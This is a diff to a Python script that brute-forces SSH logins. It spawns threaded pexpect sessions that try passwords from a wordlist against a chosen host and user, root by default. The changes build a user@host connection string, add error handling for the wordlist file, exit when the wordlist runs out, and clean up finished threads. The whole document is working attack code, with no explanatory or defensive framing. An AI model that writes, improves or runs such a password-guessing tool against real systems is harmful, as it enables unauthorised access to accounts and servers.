@@ -2,6 +2,7 @@
 import sys
 import pexpect
 import threading
+import os
 
 host = "127.0.0.1"
 user = "root"
@@ -9,10 +10,11 @@ PROMPT = r"[#|>>>|>|\$]"
 MAX_CONNECTIONS = 10 #default max ssh sessions for Linux
 found = False
 threads = []
+connString = ""
 
 def tryPass(p):
     global found
-    child = pexpect.spawn("ssh " + host)
+    child = pexpect.spawn(connString)
     child.expect("[P|p]assword:")
     child.send(p)
     ret = child.expect([pexpect.TIMEOUT,"[P|p]assword:",PROMPT])
@@ -30,11 +32,15 @@ if(len(sys.argv)>1):
 
 if(len(sys.argv)>2):
     user = sys.argv[2]
+connString = "ssh " + user + "@" + host
 
-f = open("words.txt")
-
-passes = f.readlines()
-f.close()
+try:
+    f = open("words.txt")
+    passes = f.readlines()
+    f.close()
+except OSError as err:
+    print(err)
+    exit(1)
 
 def threadLoop():
     for i in range(MAX_CONNECTIONS):
@@ -42,6 +48,7 @@ def threadLoop():
             break
         if(len(passes)==0):
             print("Wordlist exhausted. No matches. Exiting.")
+            exit(0)
 
         p = passes.pop()
         t = threading.Thread(target=tryPass,args=[p])
@@ -50,6 +57,7 @@ def threadLoop():
     
     for t in threads:
         t.join()
+        threads.remove(t)
     threadLoop()
     
 threadLoop()
